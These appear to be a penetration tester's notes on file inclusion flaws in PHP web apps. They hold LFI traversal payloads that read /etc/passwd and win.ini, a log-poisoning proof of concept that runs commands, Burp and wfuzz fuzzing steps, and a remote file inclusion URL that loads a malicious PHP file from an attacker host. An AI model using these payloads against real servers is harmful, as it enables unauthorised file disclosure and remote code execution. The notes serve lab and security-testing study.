---
description: A common vulnerability found in PHP web apps
---

# File Inclusion Vulnerabilities

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

## Local File Inclusion (LFI)

* The LFI attack is where an attacker can trick the web app into exposing or running files on the web server
* Attempt dot-dot-slash attack to ensure the attack is possible

Example: http://htb.local/?page=../../../../../../test.txt

### PoC

```
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

### Bruteforcing LFI via directory

* Obtain a GET request in burp
* Send to Intruder
* Attack type set to Sniper

Example on where to place payload:

```
GET /admin/?|PAYLOADHERE|= HTTP/2
```

* Click the add button on the right side and make sure that the payload character is between the field where the two pipes are
* Go to payloads > Load > SecLists > Discovery > Web-Content > raft-small-words.txt
* Click start attack
* Make sure to order by the largest length as that will be what you need to focus on

### Fuzzing

* This section is for if you found something from bruteforcing for LFI

```
GET /admin/?debug=|fasfoaj|
```

* Place the payload characters in between the pipes
  * Remember, the pipes are the payload characters in burp, you need to manually add this
* Go to payloads > SecLists > LFI > LFI-jhaddix.txt
* Select start attack and organize by largest length again

Example of LFI:

```
http://10.10.10.1/admin/?debug=../../../../../windows/win.ini

http://10.10.10.1/admin/?debug=../../../../../etc/passwd
```

Wfuzz:

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common number> <URL>
```

## Apache Log Poisoning

* If you can include an Apache log file through LFI, you can often inject PHP to the logs and execute that PHP using the LFI
* These logs can be stored in a variety of places
* Do more research on where these places can be

## LFI 2 RCE

{% embed url="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/" %}

## Remote File Inclusion (RFI)

* Similar to an LFI but a remote file can be included and served to execute server-side code

Example:

http://htb.local/?page=http://\<kali_IP:8000>/maliciou_s\_file.php

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
